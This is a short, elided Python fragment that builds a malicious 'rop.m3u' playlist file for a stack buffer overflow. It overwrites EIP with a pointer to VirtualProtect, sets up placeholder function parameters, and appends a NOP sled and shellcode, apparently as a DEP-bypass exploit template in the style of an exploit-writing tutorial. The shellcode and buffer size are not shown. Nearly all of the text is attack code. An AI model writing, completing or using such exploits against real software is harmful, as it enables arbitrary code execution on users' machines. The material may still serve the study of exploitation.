...
junk = "Z" * buffersize
eip = struct.pack('<I',0x7C801AD4)  #pointer to VirtualProtect
junk2 = "AAAA" #compensate
params = struct.pack('<I',0x01010101)   #return address
params = params + "XXXX"          #lpAddress
params = params + "YYYY"          #Size - Shellcode length
params = params + "ZZZZ"          #flNewProtect
params = params + struct.pack('<I',0x10035005)   #writeable address
...
nops = "\x90" * 200
rest = "C" * 300
payload = junk+eip+junk2+params+nops+shellcode+rest

with open("rop.m3u", 'w') as f:
    f.write(payload)
